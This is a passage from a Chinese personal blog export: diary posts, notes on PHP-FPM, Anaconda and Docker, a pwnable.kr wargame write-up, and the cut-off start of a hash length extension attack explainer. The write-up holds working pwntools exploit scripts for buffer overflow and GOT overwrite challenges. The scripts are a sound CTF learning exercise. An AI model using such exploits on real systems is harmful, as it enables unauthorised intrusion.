[{"title":"无题","date":"2018-06-16T03:12:15.000Z","path":"posts/2018-6-16/","text":"交了一堆 deadline，心情舒畅，忙里偷闲一下。 不知道取什么标题，就直接 Untitled 了…前几天奖学金终于到账了，于是新购了个 .moe 的域名，虽然现在的 .cn 没有什么问题，价格也还算友善，但还是更喜欢个性点的东西，至于 .me，实在是太贵了。唯一不足的是腾讯的域名邮箱不支持 .moe ，其他的企业邮箱接收起来不太方便。除了一点强迫症心理，问题不大。比起腾讯云的乱杂臃肿，还是更喜欢主机壳那种类型的。 这个博客中途更换过很多主题，最后稳定在这款 Material ，整体的风格还是挺符合自己的，但是不太喜欢文章上方的图片块，虽然现在直接调成了纯色看起来舒服了点，还是不太满意。打算用 Laravel + Vue 写一套能复用的博客，自己写的当然是最舒服的啦，都可以掌握在自己手里。加之静态博客更新起来还是挺麻烦的，不过省去了很多不稳定因素，所以目前的改一下 CSS 也许也能用，it depends。 安全还是开发，很久前想了好几个晚上，最后决定走开发，因为更喜欢去做出好看的好玩的东西。偶尔也会考虑到工作的事，也会看到国内有点浮躁的技术圈、学术圈，但是总是会有一批纯粹的人在做着、讨论着他们所热爱的东西。 守护住这些笑容就好啦。 想要去旅游，很久没有去远一点的地方走走了，它们是自己灵感的来源。 小知了响了。挺喜欢这个季节的，能做的让人愉悦的事有很多！","tags":[{"name":"煮字","slug":"煮字","permalink":"https://blog.cyris.cn/tags/煮字/"}]},{"title":"一篇水文","date":"2018-06-09T01:07:35.000Z","path":"posts/2018-6-9/","text":"写下这篇文章一部分原因是很久没更博客了，来除点草…另一部分是因为最近发生的事确实有点多，又忙于准备期末考，我觉得应该留点时间整理下心情，也当是记点流水以后无聊的时候翻着看吧～ 先说说教学评估的事，前几天学校在做评估，又是刷墙又是xxx的，领导们应该也神经紧张了挺久，倒不是说期望它评不上，其实评上了也有很多好处，只是不知道我们能获益多少罢了。但是部分教职工的素质却得推敲一番，比如有位辅导员在检查的那几天，发了个通知，大概是“你们下课了就得去图书馆，早上x点就要起床了“之类。在教室的表现需要端正一点还情有可原，难道日常起居也要作势一番？未免有股虚假之风的味道，如果全都是这样的表演，评上了也没有什么意义，反倒被自家学生：超-记-仇。 另外对学校的教师水平还是挺失望的，从大一到马上步入大三，遇到的优秀的老师不是没有，而是真的过少。有实验课连自己都不知道怎么写实验的，有对着 ppt 照搬照念的，几个学期过来，我自学所学到的东西远远大于老师教的。说是自由选的公选课，培养计划给你写死你要选哪几门（仅部分专业），可笑的是后来那些课都不开了，只留下一门能选的，而且作为一门公选课，作业比主课都要多，甚至期末了还要给你带来双份的快乐，也许这也是一种负责，但对我来说，对大多数忙于备考的人来说，这样的做法未免缺少了一点“xxxx”数。因此如果说有后悔的东西，那就是大一大二没好好地翘课去学喜欢的东西，浪费了大把时间。 印象深刻的教师自然也是有的，比如上学期的概率论老师，非常优秀，条理清晰，很近人，也能感受到他对教育的负责与热爱；以及另一位英语教师，为了能让学生真正地了解外国文化，当其他老师只呆了一周进行实地考察时，他呆了几个月。他所带回来的东西，分享给我们的东西，十分客观，深入而富有情趣，非常喜欢。因此每当遇到高质量的课程，我都会满怀兴奋地去听讲。 很多领导也都只围绕着自己学院的利益办事，并不会考虑你们学生的发展如何，“利益关系”并不是不行，但是吃相得好看。例如某学院的行事，只要去搜搜他们庆祝的文章，然后加上他们不喜欢的词就是一篇真实的文章了。学校里都有着那样一股作风，难怪会有像微博那样随意删帖／炒热的事。他们本质是一样的，只要”让这块地方看起来是我喜欢的样子“，就好了。 灵魂的对峙是沉重的，尤其是对于那些嘴上常挂”他们都是这样的，我这样有什么问题吗？“的人。由此可见鲁迅先生的笔力量有多大。讽刺的是，当时他写的话，仍然适用于这个时代。”适应社会“一词对我来说，不是去成为一个把刚才提到的那句话挂在嘴边，让利好控制自己精神的人，而是守护好自己还算健全的思想，至少在你清晰地知道”我觉得这样是对的“的情况下，不做悖于自己理念的事，否则就算做了，也会感觉到一种空洞，一种受侵蚀的空洞。 同样的，我不愿意以赚钱为目的去选择学习的内容，觉得什么好玩，就去学了。因此不太看好各大培训机构（以“提升你某项技能水平”为核心目的的那些课程除外），尤其是那种只会教你怎么写出欺骗式的简历的，不知道砸这个钱有什么意义…当然很多人其实做着与兴趣不同的事，也需要养家糊口，还是存在着很大的社会压力的，他们需要速成，需要马上得到一份工作，这其实也是那些无良机构的市场所在。 最近睡得挺迟的，感觉白天的精神不够好，看起书来也昏昏沉沉的，得不偿失。得规范下作息啦。 就谈这些吧，一点小牢骚。","tags":[{"name":"煮字","slug":"煮字","permalink":"https://blog.cyris.cn/tags/煮字/"}]},{"title":"浅谈 PHP-FPM","date":"2018-05-06T11:20:00.000Z","path":"posts/php-fpm/","text":"关于 FPM ，FastCGI ，CGI 之间的关系与区别。 一、概述什么是 FPM ？ FPM 的全称是 FastCGI Process Manager ，即 PHP FastCGI 运行模式的一个进程管理器，从定义就可以看出它的核心功能是进程管理，那它用来管理什么进程呢，这个 FastCGI 又是什么东西，和 CGI 又有什么样的关系呢？ 二、从 CGI 说起先来看一段维基百科上的描述： 通用网关接口（Common Gateway Interface/CGI）是一种重要的互联网技术，可以让一个客户端，从网页浏览器向执行在网络服务器上的程序请求数据。CGI描述了服务器和请求处理程序之间传输数据的一种标准。 CGI 是一种协议，用来保证 Web server 传递过来的数据是标准格式，以方便 CGI 程序的运行。而 Web server（例如 Nginx）承担的工作则是内容的分发，比如你要请求 /index.html，Web server 就会去文件系统中寻找这个文件，然后发送给浏览器，此时它分发的是静态资源。 PHP 是一个脚本解析器，在网络应用场景下并没有实现 HTTP 网络库，而是实现了对 CGI／FastCGI 这样的协议的解析，然后与 Web 服务器配合实现了 HTTP 的处理。 比如我们请求一个 /index.php ，根据配置，Web server 判断这是个动态资源，然后寻找 PHP 解析器进行处理。当收到一个匹配 URL 的请求时，相应的程序就会被调用，例如 PHP 解析器会解析 php.ini 文件然后初始化执行环境，并将客户端发送的数据（URL、查询的数据、HTTP header 等）作为输入，经过处理之后（比如定义的一些函数功能），程序的输出会被 Web 服务器收集，并加上合适的档头返回给客户端。 三、FastCGI 的诞生现在我们知道 CGI 只是一种协议，而 FastCGI 则是一种优化了 CGI 的协议。优化的地方，就在刚刚提到的 PHP 解析器解析 php.ini 文件并初始化执行环境 这部分。标准的 CGI 程序对每个请求都会执行这些操作，如果用户还要再次请求动态资源，Web 服务器将重新 fork 一个新的进程，这显然是一种很低效的做法，尤其是在高负载下，操作系统创建和销毁进程的开销将十分巨大。 FastCGI 不是为每一个请求创建进程，而是通过 master-worker 这样的模型，使用持久化进程来处理请求。即在服务器启动时便创建 master 与 一定数量的 worker，在请求到来时 master 可以持续分配 worker 去处理请求。FastCGI 会维护一个进程池，根据资源与请求状况调整 worker 数量以节省资源，提高性能。 四、FPM 的实现从 PHP54 开始，PHP 官方加入了 FPM 来管理 FastCGI 的进程。注意，在这之后 PHP-FPM 与 PHP-CGI 没有任何关系。PHP-FPM 是对 FastCGI 的具体实现，而 PHP-CGI 只是个 CGI 程序，并不会管理进程。 简单来说，FPM 的实现就是创建一个 master 进程，在 master 进程中创建并监听 socket，然后 fork 出多个子进程，这些子进程各自接受请求。子进程的处理非常简单，它在启动后阻塞在 accept 上，有请求到达后开始读取请求数据，读取完成后开始处理然后再返回，在这期间是不会接收其它请求的，也就是说 FPM 的子进程同时只能响应一个请求，只有把这个请求处理完成后才会 accept 下一个请求。 FPM 的 master 进程与 worker 进程之间不会直接进行通信，master 通过共享内存获取 worker 进程的信息，比如 worker 进程当前状态、已处理请求数等，当 master 进程要 kill 一个 worker 进程时则通过发送信号的方式通知 worker 进程。 FPM 可以同时监听多个端口，每个端口对应一个 worker pool，而每个 pool 下对应多个 worker 进程，类似 Nginx 中 Server 的概念。 我们在配合 Nginx 的使用的时候，常常会遇到 502 的错误，这是因为没有可用的进程了，就返回了错误。如果是 worker 进程处理请求超时，则返回 504 错误。 关于 FPM 的详细实现可以参考 PHP7 内核剖析 - fpm 这篇文章。","tags":[{"name":"PHP","slug":"PHP","permalink":"https://blog.cyris.cn/tags/PHP/"},{"name":"FPM","slug":"FPM","permalink":"https://blog.cyris.cn/tags/FPM/"}]},{"title":"Anaconda 初体验","date":"2018-04-29T05:47:25.000Z","path":"posts/python-with-anaconda/","text":"Anaconda 是一个 Python 的发行版，包含了丰富的科学计算包，并有 Conda 这一工具进行包与环境的管理。 它的体积确实有点大，小容量选手可以考虑 Miniconda。 一、 安装 Anaconda下载地址：https://www.anaconda.com/download/ 以 macOS 为例，程序安装时它会在 ~/.bash_profile 写入 Path： # added by Anaconda3 5.1.0 installer export PATH=&quot;/Users/cyris/anaconda3/bin:$PATH&quot; 如果用的是 zsh ，就在 .zshrc 中手动添加这条命令。 让配置生效： $ source .zshrc 查看配置是否生效： $ conda --version 二、 使用 Conda 进行环境管理Update Conda: $ conda update -n base conda 创建一个名为 venv 的环境，Python 版本指定为 2.7： $ conda create -n venv python=2.7 激活环境： $ source activate venv 退出当前环境： $ source deactivate 删除环境： $ conda remove -n venv --all 复制一个环境（已有一个名为 venv 的环境）： $ conda create -n venv-2 --clone venv 查看所有环境： $ conda info -e 可以简化一下命令，在 .zshrc 中添加一个别名：alias workon=&#39;source activate&#39;，就可以用 $ workon env-name 的方式激活环境了。 所有环境都会被安装在 /anaconda3/envs/ 目录下。 三、 Package 管理给某个特定环境安装 Package 有两种方式： 直接切换到那个环境中然后使用 conda install package-name 命令进行安装 在执行安装命令时添加 -n 参数来指定环境：conda install -n env-name package-name 查看已经安装的 Package：conda list （要查看指定环境中安装的包，同样在后面加上 -n 参数就好了。） 查找包： $ conda search package-name 更新包： $ conda update package-name 一些 conda 没有的包，可以使用 pip 安装。","tags":[{"name":"Python","slug":"Python","permalink":"https://blog.cyris.cn/tags/Python/"}]},{"title":"Vidar-Team 夏季会服设计","date":"2018-04-23T14:25:59.000Z","path":"posts/vidar-logo/","text":"咕了很久的会服上线啦，加入了点十周年纪念的元素 XD。 顺便整理了下美工材料：Vidar-Logo","tags":[{"name":"煮字","slug":"煮字","permalink":"https://blog.cyris.cn/tags/煮字/"}]},{"title":"利用 HTML 在 Markdown 中打出数学符号","date":"2018-03-28T04:03:56.000Z","path":"posts/markdown-tip/","text":"想要打出奇奇怪怪的符号 :D 1. 上标n2=n+1 n&lt;sup&gt;2&lt;/sup&gt;=n+1 2. 下标a=log2b a=log&lt;sub&gt;2&lt;/sub&gt;b 3. 注册商标hexo &reg; hexo &amp;reg; 4. function 符号&fnof;(x)=x+1 &amp;fnof;(x)=x+1 5. 根号&radic;2 （感觉不是很好看） &amp;radic;2 6. 角度符号30&deg; 30&amp;deg; 7. 一点小工作整理了一些比较常用的特殊符号的 HTML 编码： 符号 说明 编码 &times; 乘号 &amp;times; &divide; 除号 &amp;divide; &larr; 向左箭头 &amp;larr; &rarr; 向右箭头 &amp;rarr; &uarr; 向上箭头 &amp;uarr; &darr; 向下箭头 &amp;darr; &harr; 双向箭头 &amp;harr; &lArr; 双线向左箭头 &amp;lArr; &rArr; 双线向右箭头 &amp;rArr; &hArr; 双线双向箭头 &amp;hArr; &nbsp; 空格 &amp;nbsp; &plusmn; 正负符号 &amp;plusmn; &infin; 无限大符号 &amp;infin; &ang; 角度符号 &amp;ang; &int; 微积分符号 &amp;int; &iquest; 倒问号 &amp;iquest; &ne; 不等于符号 &amp;ne; &equiv; 相等符号 &amp;equiv; &le; 小于等于符号 &amp;le; &ge; 大于等于符号 &amp;ge; &para; 段落符号 &amp;para; &sect; 章节符号 &amp;sect; &perp; 垂直符号 &amp;perp; &copy; 版权所有符号 &amp;copy; &trade; 商标符号 &amp;trade; &reg; 注册商标符号 &amp;reg; &frac12; 二分之一符号 &amp;frac12; &permil; 百分符号 &amp;permil; &there4; 所以符号 &amp;there4; &pi; 圆周率符号 &amp;pi; &alpha; Alpha 符号 &amp;alpha; &beta; Bata 符号 &amp;beta; &gamma; Gamma 符号 &amp;gamma; &Delta; Delta 符号 &amp;Delta; &theta; Theta 符号 &amp;theta; &lambda; Lambda 符号 &amp;lambda; &Sigma; Sigma 符号 &amp;Sigma; &tau; Tau 符号 &amp;tau; 再记录一个异或符号：⊕ 参考文章： 如何在markdown中打出上标、下标和一些特殊符号","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://blog.cyris.cn/tags/Notebook/"}]},{"title":"利用 Dokcer 部署 PHP 开发环境","date":"2018-03-19T06:28:15.000Z","path":"posts/docker-php/","text":"利用 Docker 手动配置 PHP + Njinx + MySQL 开发环境。 手动配置的方法为：先拉取一个 ubuntu 镜像并创建相应的容器，在容器内部进行 PHP 相关环境部署。关于 docker 的说明以及具体的安装的方法请参考官方文档。 更新：一次 docker-compose 的实践：Ezdock 1. 安装 docker如果是在服务器端（以 ubuntu 为例），安装 docker 的基础操作有： sudo apt-get install -y docker.io #安装docker service docker start #启动docker service docker stop #关闭docker 简单说一下 image 与 container 的区别。前者为镜像，后者为容器，容器基于镜像，而我们平时用的 docker run 命令是从已有镜像中开启一个新的容器。 2. 拉取镜像docker 成功运行以后： sudo docker pull ubuntu #不指定版本，直接拉取一个 ubuntu 最新的 image ，如需指定版本可以用 ubuntu:16.04 的方式。 3. 创建测试容器现在我们已经有了一个 ubuntu 的镜像，接下来创建测试容器： sudo docker images #查看所有镜像 sudo docker run -i -t --name=&quot;my_ubuntu&quot; image_id /bin/bash # 创建一个新的容器并运行，如果需要映射端口可以加上 -p 参数（如 -p 8083:80 ，前者为主机端口，后者为容器端口）。 # -i: 以交互模式运行容器，通常与 -t 同时使用； # -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； # --name=&quot;my_ubuntu&quot;: 为容器指定一个名称； sudo docker ps #查看正在运行的容器 另外，当我们 exit 一个容器时，因为没有加 -d 参数，所以容器也会 stop ，如果需要再次进入可以先启动容器： docker start container_id 然后有两种方法重新进入交互状态，docker attach 与 docker exec -it 。用前者进入 container 时如果退出了容器，它依然会 stop ，而用后面的方式进入容器即使退出了交互界面 container 仍然会在后台运行。完整命令如下： docker exec -it container_id /bin/bash 4. 环境搭建现在我们已经进入了一个容器中，下面安装 PHP + Nginx + MySQL 的环境： apt-get update apt-get install nginx apt-get install mysql-server apt-get install php 为了方便测试可以自行 apt-get install net-tools, vim, curl, unzip 等工具。 5. 传输写好的代码如果想要传输写好的代码到服务器上或者到 docker 中，有几条命令： 传输到服务器上（最好先打包为 zip ）： scp local_file remote_username@remote_ip:remote_path 传入 docker 容器中： 将主机 /www/runoob 目录拷贝到容器 96f7f14e99ab 的 /www 目录下： docker cp /www/runoob 96f7f14e99ab:/www/ 将主机 /www/runoob 目录拷贝到容器 96f7f14e99ab 中，目录重命名为 www ： docker cp /www/runoob 96f7f14e99ab:/www 将容器 96f7f14e99ab 的 /www 目录拷贝到主机的 /tmp 目录中： docker cp 96f7f14e99ab:/www /tmp/ 我们将代码解压至容器中 /var/www/html/ 目录下，但此时访问 php 会直接弹出下载而非解析，需要修改下 nginx 的配置文件，进入 /etc/nginx/sites-enabled/default ，修改 php 部分为： location ~ \\.php$ { fastcgi_pass unix:/run/php/php7.0-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; include fastcgi_params; } 重启下 nginx 就可以解析 php 了，其他的配置网上已经有很多的教程，这里就不多说了。 6. 几条服务重启命令/etc/init.d/mysql restart /etc/init.d/nginx restart /etc/init.d/php7.0-fpm restart 参考文章： 从零学习Docker部署环境","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://blog.cyris.cn/tags/Notebook/"}]},{"title":"小谈 URI、URL 与 URN","date":"2018-03-18T08:37:08.000Z","path":"posts/url-talk/","text":"Talk about URL. 🐥 0x00 引言小科普帖。 我们一般对 URL 比较熟悉，但很少了解 URI 与 URN ，以及这三者之间的关系，先放一张它们的关系图： 0x01 概念三个名词的定义： URI (Uniform Resource Identifier) : 统一资源标识符。是一个用于标识某一互联网资源名称的字符串。 该种标识允许用户对网络中（一般指万维网）的资源通过特定的协议进行交互操作。 URL (Uniform Resource Locator) : 统一资源定位符（或称统一资源定位器/定位地址、URL 地址等）。有时也被俗称为网页地址（网址）。如同在网络上的门牌，是因特网上标准的资源的地址（Address）。 URN (Uniform Resource Name) : 统一资源名称，是统一资源标识（URI）的历史名字，它使用 urn: 作为 URI scheme。 简单地说，URI 可被视为定位符（URL），名称（URN）或两者兼备。 统一资源名（URN）如同一个人的名称，而统一资源定位符（URL）代表一个人的住址。换言之，URN 定义某事物的身份，而 URL 提供查找该事物的方法。如果觉得这样说有点绕，那我们来看看如何用一句话区分 URL 与 URI。 0x02 一句话区分 URL 与 URIURL 是 URI 的子集。 任何东西只要能够唯一地标识出来，都可以说这个标识是 URI 。如果这个标识还能获取到上述对象的路径，那么它同时还可以是一个 URL 。但是如果它不能提供获取到对象的路径，那么它必然不是 URL 。 即 URI 与 URL 都定义了 what the resource is，而 URL 还要包含 where (the resource is) 与 how (to get the resource) 。 0x03 栗子栗子比如现在有一个网站：https://cyris.cn/dir/filename.html 。 其中 dir/filename.html 就是一个 URI ，而整个链接就是一个 URL ，它包含了指定什么协议（https），在哪个站点（cyris.cn），去获取什么资源（dir/filename.html）。 正如上面所说，URI 只要是能唯一标识资源即可，而 URL 包括了 where，how，what 三者。","tags":[{"name":"Notebook","slug":"Notebook","permalink":"https://blog.cyris.cn/tags/Notebook/"}]},{"title":"pwnable.kr writeup","date":"2018-03-12T06:25:28.000Z","path":"posts/pwnable-kr/","text":"学习一下 Pwn 。 网址：http://pwnable.kr [Toddler’s Bottle]fd Mommy! what is a file descriptor in Linux? try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://www.youtube.com/watch?v=blAxTfcW9VU ssh fd@pwnable.kr -p2222 (pw:guest) 给出了源码 : #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0; } 查询一下 file descriptor ： Integer value Name symbolic constant file stream 0 Standard input STDIN_FILENO stdin 1 Standard output STDOUT_FILENO stdout 2 error STDERR_FILENO stderr 标准 io 中，read 函数的第一个参数需要为 0 （即标准输入），0x1234 转换为十进制为 4660 ，另外 buf 需要等于 “LETMEWIN\\n” ，poc 如下： from pwn import * pwn_ssh = ssh(host = &#39;pwnable.kr&#39;, user = &#39;fd&#39;, password = &#39;guest&#39;, port = 2222) print (pwn_ssh.connected()) sh = pwn_ssh.process(argv = [&#39;fd&#39;,&#39;4660&#39;], executable = &#39;./fd&#39;) sh.sendline(&quot;LETMEWIN&quot;) print (sh.recvall()) mommy! I think I know what a file descriptor is!! collision Daddy told me about cool MD5 hash collision today.I wanna do something like that too! ssh col@pwnable.kr -p2222 (pw:guest) 同样给出了源码： #include &lt;stdio.h&gt; #include &lt;string.h&gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0; } check_password 函数把传入的数组中的数据（char 类型）转换为 int 类型后求和，总共有 5 个数，而一个 int 占四个字节，长度刚好为 20 bytes ，满足要求。 接着构造需要传入的数据。要使结果等于 0x21DD09EC ，可以先将 (568134124+1) / 5 = 113626825 。前四组数据为 113626825，第五组需要减个 1（即 113626824）。转换一下类型就是 ‘0x6c5cec9’ * 4 + ‘0x6c5cec8’ ，即 ‘\\x06\\xc5\\xce\\xc9’ * 4 + ‘\\x06\\xc5\\xce\\xc8’。 因为目标服务器使用的是小端序存储，最后需要把传入的字符反一下： ./col `python -c &quot;print &#39;\\xc9\\xce\\xc5\\x06&#39; * 4 + &#39;\\xc8\\xce\\xc5\\x06&#39;&quot;` poc: from pwn import * pwn_ssh = ssh(host = &#39;pwnable.kr&#39;, user = &#39;col&#39;, password = &#39;guest&#39;, port = 2222) print (pwn_ssh.connected()) data = &#39;\\xc9\\xce\\xc5\\x06&#39; * 4 + &#39;\\xc8\\xce\\xc5\\x06&#39; sh = pwn_ssh.process(argv = [&#39;col&#39;, data], executable = &#39;./col&#39;) print (sh.recvall()) daddy! I just managed to create a hash collision :) bof Nana told me that buffer overflow is one of the most common software vulnerability.Is that true? Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 bof.c : #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } 一道关于缓冲区溢出的题，需要通过 overflow 来覆盖 key 的值。 ida 载入后进入 func 函数： 可以找到 a1 的地址为 ebp+8h ，s 的地址为 ebp-2Ch，距离差 52，所以要覆盖 52 个字符。 (python -c &quot;print &#39;A&#39;*52 + &#39;\\xbe\\xba\\xfe\\xca&#39;&quot;; cat) | nc pwnable.kr 9000 # 同样需要注意后面的字符需要倒序传入；另外这里的 cat 既能让 nc 的 tcp 会话不结束（直到用户输入 Ctrl+C），又可以将用户输入的内容重定向给 nc。 exp: from pwn import * pwn_socket = remote(&#39;pwnable.kr&#39;, 9000) pwn_socket.sendline(&#39;A&#39; * 52 + &#39;\\xbe\\xba\\xfe\\xca&#39;) pwn_socket.interactive() daddy, I just pwned a buFFer :) flag Papa brought me a packed present! let’s open it. Download : http://pwnable.kr/bin/flag This is reversing task. all you need is binary ida 载入后发现字符串：”This file is packed with the UPX”，那就用 upx 去解密 elf。 首先安装 upx : sudo apt-get install upx-ucl 之后执行命令解压 : upx -d flag 重新用 ida 载入后找到 flag ： .rodata:0000000000496628 aUpxSoundsLikeA db &#39;UPX...? sounds like a delivery service :)&#39;,0 .rodata:0000000000496628 ; DATA XREF: .data:flag↓o UPX...? sounds like a delivery service :) passcode Mommy told me to make a passcode based login system.My initial C code was compiled without any error!Well, there was some compiler warning, but who cares about that? ssh passcode@pwnable.kr -p2222 (pw:guest) 源代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\\n&quot;); exit(0); } } void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name); } int main(){ printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0; } login() 中两个 scanf 都没有取地址，这会导致程序使用两个 passcode 的值作为存储输入的地址，如果地址不可写就会造成程序内部错误。 这样就不能直接写入特定的 passcode 值了，思路是 GOT 表覆写。 由于 welcome() 和 login() 函数是连续调用的，导致它们有相同的地址，从下面这两段代码中也可以看出，它们都在 esp+18h 的位置： unsigned int welcome() { char v1; // [esp+18h] [ebp-70h] unsigned int v2; // [esp+7Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(&quot;enter you name : &quot;); __isoc99_scanf(&quot;%100s&quot;, &amp;v1); printf(&quot;Welcome %s!\\n&quot;, &amp;v1); return __readgsdword(0x14u) ^ v2; } int login() { int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(&quot;enter passcode1 : &quot;); __isoc99_scanf(&quot;%d&quot;); fflush(stdin); printf(&quot;enter passcode2 : &quot;); __isoc99_scanf(&quot;%d&quot;); puts(&quot;checking...&quot;); if ( v1 != 338150 || v2 != 13371337 ) { puts(&quot;Login Failed!&quot;); exit(0); } puts(&quot;Login OK!&quot;); return system(&quot;/bin/cat flag&quot;); } 这样 name 和 passcode1 就存在于相同的栈空间了。name 的地址为 ebp-70h ，passcode1 的地址为 ebp-10h ，两者相距 96 个字节，有 4 个字节的任意地址写。我们可以把 passcode1 覆盖为 fflush 的地址，然后利用 scanf 把 system 的地址写过去，这样等执行 fflush 时就能执行 system 了（即把 fflush 的 GOT 表值改为 080485E3 ）。 system 的地址： .text:080485E3 mov dword ptr [esp], offset command ; &quot;/bin/cat flag&quot; .text:080485EA call _system poc: from pwn import * context.log_level = &#39;debug&#39; context.terminal = [&#39;terminator&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;] bin = ELF(&#39;./passcode&#39;) cn = ssh(host=&#39;pwnable.kr&#39;, user=&#39;passcode&#39;, password=&#39;guest&#39;, port=2222).process(&quot;./passcode&quot;) cn.recv() cn.sendline(&#39;a&#39;*96 + p32(bin.got[&#39;fflush&#39;])) cn.recv() cn.sendline(str(0x080485E3)) print cn.recv() 再记录两条命令： objdump -d passcode readelf -r passcode Sorry mom.. I got confused about scanf usage :(","tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.cyris.cn/tags/CTF/"},{"name":"PWN","slug":"PWN","permalink":"https://blog.cyris.cn/tags/PWN/"}]},{"title":"哈希长度扩展攻击","date":"2018-02-02T09:00:58.000Z","path":"posts/hash-extender-attack/","text":"哈希长度扩展攻击利用了 MD5 ，SHA1 等加密算法的缺陷，可以在不知道原始密钥的情况下计算出一个对应的 hash 值。 0x00 引言做题的时候看到了这个问题，挺好玩的，记录一下。 题目中的代码： &lt;?php $auth = false; $role = &quot;guest&quot;; $salt = ; if (isset($_COOKIE[&quot;role&quot;])) { $role = unserialize($_COOKIE[&quot;role&quot;]); $hsh = $_COOKIE[&quot;hsh&quot;]; if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) { $auth = true; } else { $auth = false; } else {} $s = serialize($role); setcookie(&#39;role&#39;,$s); $hsh = md5($salt.strrev($s)); setcookie(&#39;hsh&#39;,$hsh); } if ($auth) { echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot; } else { echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;; } ?&gt; 一篇不错的文章：https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks 0x01 简单了解hash函数哈希函数以区块为单位操作数据。诸如MD5, SHA1, SHA256的区块长度都是512 bits 。大多数 message 的长度不会刚好可以被哈希函数的区块长度整除。因此 message 就必须被填充（ padding ）至区块长度的整数倍。 这里简单说一下MD5的加密原理，详细的描述可以参考 RFC1321 MD5是输入不定长度信息，输出固定长度128-bits的算法。即使原文中出现一个微小的变化，其散列结果也会发生巨大变化。空文的散列为： MD5(&quot;&quot;) = d41d8cd98f00b204e9800998ecf8427e MD5算法包括几个步骤：1. 补位；2. 补长度；3. 初始化MD缓冲区；4. 处理字块消息。它以512bit为一个块进行迭代运算，第一个块计算完成后四个寄存器的值就会更新，如果还存在下一个块，就在此基础上继续进行迭代计算，全部完成后，把四个寄存器中的十六进制连接起来，就是最后的md5值。简单讲一下这几个步骤： 1 - 补位如果当前的数据长度不满足对 512bit 求余为 448bit ，即len(message) % 512 != 448时，需要补位至满足这个条件。补位方式： 首先补一个1（二进制位上的1，而非十进制位上的） 在后面补0（也是二进制位上的），直到满足条件（数据比特长度对 512 求余为 448） 注意，如果消息长度已经达到 448bit ，也要进行补位，补位是必须的。 2 - 补长度即补 64bit 的长度，这个长度是在补 1 和 0 以前的长度，如果长度超出了 64bit，那么就取低 64bit。 引用一下lightless文章里的说法。完成补位与补长度的操作后，一个块可能是这个样子的： raw_data + &#39;\\x80&#39; + &#39;\\x00&#39;*n + &#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39; 第一个 raw_data 的部分就是原始的数据，第二个部分’\\x80’是一开始补的一个二进制位 1，接着补若干个 \\ x00，直到整个长度达到 56Byte，最后的 8Byte 就是 raw_data 的长度，如果 raw_data 的长度超过了 2^64bit，则取低 64bit. 附1，2步的文档介绍 Step 1. Append Padding Bits The message is “padded” (extended) so that its length (in bits) is congruent to 448, modulo 512. That is, the message is extended so that it is just 64 bits shy of being a multiple of 512 bits long. Padding is always performed, even if the length of the message is already congruent to 448, modulo 512. Padding is performed as follows: a single “1” bit is appended to the message, and then “0” bits are appended so that the length in bits of the padded message becomes congruent to 448, modulo 512. In all, at least one bit and at most 512 bits are appended. Step 2. Append Length A 64-bit representation of b (the length of the message before the padding bits were added) is appended to the result of the previous step. In the unlikely event that b is greater than 2^64, then only the low-order 64 bits of b are used. (These bits are appended as two 32-bit words and appended low-order word first in accordance with the previous conventions.) At this point the resulting message (after padding with bits and with b) has a length that is an exact multiple of 512 bits. Equivalently, this message has a length that is an exact multiple of 16 (32-bit) words. Let M[0 … N-1] denote the words of the resulting message, where N is a multiple of 16. 3 - 